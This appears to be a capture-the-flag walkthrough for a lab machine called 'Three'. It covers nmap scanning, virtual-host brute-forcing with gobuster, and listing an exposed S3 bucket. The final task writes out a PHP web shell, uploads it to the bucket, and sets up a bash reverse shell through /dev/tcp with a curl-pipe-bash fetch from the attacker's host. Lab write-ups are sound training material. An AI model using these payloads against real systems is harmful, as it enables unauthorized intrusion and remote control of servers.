# GUIDE for THREE

## Task 1

For the first one, do a simple nmap to scan all the ports and see how many tcp port are open. 

```bash
nmap -sV -sC [IP]
```

Then after interpreting the shema we can see that there is only two ports open.

---
## Task 2


For this one we just need to go to the search bar of mozilla or any navigator and type, and navigate to the contact page and get the domaine of the email adress we can see on it.

```bash
http://[IP]

```
---
## Task 3 


In case the DNS server is absente we need to change the 

```bash
/etc/hosts
```

You can choose to directly type the ip adresse we need to go to and the domaine name directly in the file with nano.

or there is a fastest way to do it.

```bash
echo "[IP] [domain.domain]" | sudo tee -a /etc/hosts
```

echo        -- de l'entrer a inserer dans le fichier <br/>
tee         -- permet d'inserer l'echo dans un fichier <br/>
-a          -- permet d'ecrire l'echo a la fin d'un fichier sans le remplacer <br/>
/etc/hosts  -- fichier visé <br/>

---
## Task 4  

To find the subdomain will make a bruteforcing using a wordlist and gobuster to test every possibility and then find the subdomains available.

```bash
gobuster vhost -w /path/to/the/wordlist -u http://domain-that-we-need-to-bruteforce.example --append-domain
```

We got two domain available et the good one is "s3.thetoppers.htb"

---
## Task 5

We need to discover what is the service that is running on this website. For this we can find the solution just with a quick research on google by typing something like "s3 service".

---
## Task 6

After this for this task we can just type on google "wich command line can be use with amazon s3 service and easily get the answers. 

awscli

---
## Task 7 

We can configure it with the command

```bash
aws configure
```

---
## Task 8

To list all of the s3 bucket we can use 

```bash
aws s3 ls
```

In our case we use it like this.

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls 
```

like this we can see the s3 buckets.

---
## Task 9

To see a list of what is present in that bucket we can use a command and specify the bucket we need a list of.

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://[name-of-the-bucket]
```

Adn finnaly with this we can see that the server is running with a php script.

## Task 10

At the moment we know about the bucket we can actively act to make a shell. <br/>
Once we know that the script is in php the shell as to be in php.<br/>
In this case we try to make a shell who's gonna ask for the command line. <br/>

```bash
<?php system($_GET['cmd']);?>
```

Once we did that we have to create php file that we will call "shell.php"

```bash
echo '<?php system($_GET['cmd']);?>' > shell.php
```

After this we can try to see if we get an answer from the server by tiping a line into the navigator. But before this we have to upload it to the server with: 

```bash
aws --enpoint=http://s3.thetoppers.htb s3 cp shell.php s3://[name-of-the-bucket]
```

Then 

```bash
http://thetopper.htb/shell.php?cmd=id

```
All of this to let us know that the connection is ok by seeing the id into the navigator. So we now can try to get a reverse shell.

To start we will create a script sh 

```bash
echo 'bash -i >& /dev/tcp/[our IP]/[listening port] >&1' > shell.sh
```

Then we will initialize a ncat to listen

```bash
nc -nvlp [listening port]
```

And to finish we will start a http server and host the bash file

```bash
python3 -m http.server 8000
```

Finnaly we can go to the navigator to type an adresse to get our server to run. With curl we will feth the reverse shell file to excute the bash and have it on our bash.

```bash
http://thetopper.htb/shell.php?cmd=curl%20[our IP]:8000/shell.sh|bash
```

And then navigate into your ncat to find the flag.txt.

